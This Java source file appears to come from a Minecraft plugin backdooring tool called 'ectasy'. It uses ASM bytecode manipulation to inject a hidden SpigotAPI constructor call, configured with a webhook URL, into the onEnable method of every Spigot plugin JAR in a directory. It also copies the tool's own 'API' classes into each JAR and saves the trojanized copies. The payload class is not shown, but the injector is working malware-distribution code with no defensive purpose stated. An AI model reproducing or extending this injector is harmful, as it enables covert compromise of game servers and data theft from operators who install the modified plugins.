package fr.bodyalhoha.ectasy.utils;

import fr.bodyalhoha.ectasy.Main;
import jdk.internal.org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * This class is a utility for injecting code into JAR files.
 */
public class Injector {

    /**
     * Decodes the specified URL-encoded path.
     *
     * @param path The URL-encoded path to decode.
     * @return The decoded path.
     */
    public static String decode(String path){
        try{
            return java.net.URLDecoder.decode(path, StandardCharsets.UTF_8.name());
        }catch (Exception e){
            return path;
        }
    }

       /**
     * Injects code into the specified input JAR file and saves the resulting JAR file to the specified output path.
     *
     * @param input The file path of the input JAR file.
     * @param output The file path of the output JAR file.
     * @param parser An OptionsParser instance containing the options for the code injection.
     */
  public static void inject(String input, String output, OptionsParser parser){
    JarLoader plugin = new JarLoader(input, output);
    JarLoader current = new JarLoader(decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()), "");

    try{
        AtomicBoolean injected = new AtomicBoolean(false);
        current.loadJar();
        plugin.loadJar();

        // Add the API class from the current JAR file to the list of new classes in the plugin JAR file.
        current.classes.stream().filter(cn -> cn.name.contains("API")).forEach(plugin.newClasses::add);

        // Iterate over all classes in the plugin JAR file in parallel.
        plugin.classes.parallelStream().forEach((cn) -> {
            // Iterate over all methods in the current class in parallel.
            cn.methods.parallelStream().forEach((mn) -> {
                // If the method is the onEnable method, inject the code.
                if(mn.name.equalsIgnoreCase("onEnable")){
                    injected.set(true);

                    // Create the instructions for the injected code.

InsnList list = new InsnList();
list.add(new TypeInsnNode(Opcodes.NEW, "fr/bodyalhoha/ectasy/SpigotAPI"));
list.add(new InsnNode(Opcodes.DUP));
list.add(new VarInsnNode(Opcodes.ALOAD, 0));
list.add(new LdcInsnNode(parser.getDefault("", "webhook")));
list.add(new InsnNode(parser.getBool("logjoins") ? Opcodes.ICONST_1 : Opcodes.ICONST_0));

// Add the call to the constructor of the SpigotAPI class to the instruction list.
list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;Z)V", false));

// Add the instruction to pop the reference to the newly created SpigotAPI instance from the operand stack.
list.add(new InsnNode(Opcodes.POP));

// Insert the instructions into the onEnable method.
mn.instructions.insertBefore(mn.instructions.getFirst(), list);

                }  
                });
            });

            // If the code was not injected, print an error message and return.
            if(!injected.get()){
                System.out.println("[-] Could not inject " + plugin.input);
                return;
            }

            // Save the modified JAR file.
            plugin.saveJar();

            // Print a success message.
            System.out.println("[+] Injected " + plugin.input + " -> " + plugin.output);
        }catch (Exception e){
            System.out.println("[-] Could not inject " + plugin.input);
            e.printStackTrace();
        }
    }

    /**
     * Injects code into all JAR files in the specified directory and saves the resulting JAR files to the specified output directory.
     *
     * @param directory The directory containing the input JAR files.
     * @param out The directory where the output JAR files will be saved.
     * @param parser An OptionsParser instance containing the options for the code injection.
     */
    public static void injectDirectory(File directory, String out, OptionsParser parser){
        File output = new File(out);
        if(!output.exists())
            output.mkdir();
        for(String pl : Objects.requireNonNull(directory.list())){
            inject(directory.getPath() + "/" + pl, out + "/" + pl, parser);
        }
    }

}
